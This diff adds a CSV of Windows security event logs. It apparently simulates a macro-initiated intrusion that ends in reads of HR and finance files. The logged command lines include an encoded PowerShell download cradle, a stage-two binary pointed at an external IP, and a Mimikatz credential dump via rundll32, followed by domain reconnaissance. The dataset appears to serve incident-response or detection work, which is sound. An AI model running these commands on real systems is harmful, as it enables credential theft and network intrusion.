@@ -1,0 +1,24 @@
+timestamp,event_id,computer,username,event_type,description
+2025-01-14T09:12:03,4688,WORKSTATION-03,jsmith,Process Created,New process. Image: C:\Windows\System32\wscript.exe. Parent: WINWORD.EXE. CommandLine: wscript.exe /b macro_runner.vbs. PID: 2341
+2025-01-14T09:12:07,4688,WORKSTATION-03,jsmith,Process Created,New process. Image: C:\Windows\System32\cmd.exe. Parent: wscript.exe. CommandLine: cmd.exe /c. PID: 2398
+2025-01-14T09:12:15,4688,WORKSTATION-03,jsmith,Process Created,New process. Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe. Parent: cmd.exe. CommandLine: powershell.exe -encodedcommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA. PID: 2412
+2025-01-14T09:13:02,4688,WORKSTATION-03,jsmith,Process Created,New process. Image: C:\Windows\Temp\stage2.exe. Parent: powershell.exe. CommandLine: stage2.exe -c 185.199.110.55. PID: 2589
+2025-01-14T09:13:25,4672,WORKSTATION-03,jsmith,Special Privileges Assigned,Special privileges assigned. Account: jsmith. Privileges: SeDebugPrivilege SeImpersonatePrivilege. Process: stage2.exe. PID: 2589
+2025-01-14T09:14:48,4688,WORKSTATION-03,jsmith,Process Created,New process. Image: C:\Windows\System32\rundll32.exe. Parent: stage2.exe. CommandLine: rundll32.exe C:\Windows\Temp\mimi.dll sekurlsa::logonpasswords. PID: 2734
+2025-01-14T09:14:55,4688,WORKSTATION-03,jsmith,Process Created,New process. Image: C:\Windows\System32\whoami.exe. Parent: stage2.exe. CommandLine: whoami /all. PID: 2801
+2025-01-14T09:15:09,4688,WORKSTATION-03,jsmith,Process Created,New process. Image: C:\Windows\System32\net.exe. Parent: stage2.exe. CommandLine: net user jsmith /domain. PID: 2836
+2025-01-14T09:15:32,4688,WORKSTATION-03,jsmith,Process Created,New process. Image: C:\Windows\System32\net.exe. Parent: stage2.exe. CommandLine: net view /domain. PID: 2871
+2025-01-14T09:15:48,4688,WORKSTATION-03,jsmith,Process Created,New process. Image: C:\Windows\System32\ping.exe. Parent: stage2.exe. CommandLine: ping -n 1 10.0.1.5. PID: 2903
+2025-01-14T09:16:02,4625,WORKSTATION-03,jsmith,Failed Logon,Account failed to log on. Account Name: jsmith. Failure Reason: Bad password. Logon Type: 3. Source: 10.0.1.15. Workstation: WORKSTATION-03
+2025-01-14T09:16:09,4625,WORKSTATION-03,jsmith,Failed Logon,Account failed to log on. Account Name: jsmith. Failure Reason: Bad password. Logon Type: 3. Source: 10.0.1.15. Workstation: WORKSTATION-03
+2025-01-14T09:16:18,4625,WORKSTATION-03,jsmith,Failed Logon,Account failed to log on. Account Name: jsmith. Failure Reason: Bad password. Logon Type: 3. Source: 10.0.1.15. Workstation: WORKSTATION-03
+2025-01-14T09:22:04,4624,FILE-SERVER-01,jsmith,Network Logon,Network logon successful. Type 3. Account: jsmith. Source: 10.0.1.15. Authentication: NTLM. Workstation: WORKSTATION-03. Elevated Token: No
+2025-01-14T09:22:06,4672,FILE-SERVER-01,jsmith,Special Privileges Assigned,Privileges assigned. Account: jsmith. Privileges: SeDebugPrivilege SeBackupPrivilege. Process: explorer.exe
+2025-01-14T09:22:18,4688,FILE-SERVER-01,jsmith,Process Created,New process. Image: C:\Windows\System32\cmd.exe. Parent: wmiprvse.exe. CommandLine: cmd.exe /c dir C:\HR. PID: 1834
+2025-01-14T09:22:34,4688,FILE-SERVER-01,jsmith,Process Created,New process. Image: C:\Windows\System32\net.exe. Parent: cmd.exe. CommandLine: net share. PID: 1892
+2025-01-14T09:23:01,4663,FILE-SERVER-01,jsmith,Object Access,File access audit. Object: C:\HR\employee_salaries.xlsx. Access: ReadData. Process: cmd.exe. PID: 1834
+2025-01-14T09:23:14,4663,FILE-SERVER-01,jsmith,Object Access,File access audit. Object: C:\HR\contract_terms_2025.docx. Access: ReadData. Process: cmd.exe. PID: 1834
+2025-01-14T09:23:27,4663,FILE-SERVER-01,jsmith,Object Access,File access audit. Object: C:\HR\performance_reviews.xlsx. Access: ReadData. Process: cmd.exe. PID: 1834
+2025-01-14T09:23:45,4663,FILE-SERVER-01,jsmith,Object Access,File access audit. Object: C:\Finance\budget_FY2025.xlsx. Access: ReadData. Process: cmd.exe. PID: 1834
+2025-01-14T09:25:12,4663,FILE-SERVER-01,jsmith,Object Access,File access audit. Object: C:\Finance\payroll_Q4.csv. Access: ReadData. Process: cmd.exe. PID: 1834
+2025-01-14T09:25:38,4663,FILE-SERVER-01,jsmith,Object Access,File access audit. Object: C:\Finance\vendor_contracts.xlsx. Access: ReadData. Process: cmd.exe. PID: 1834
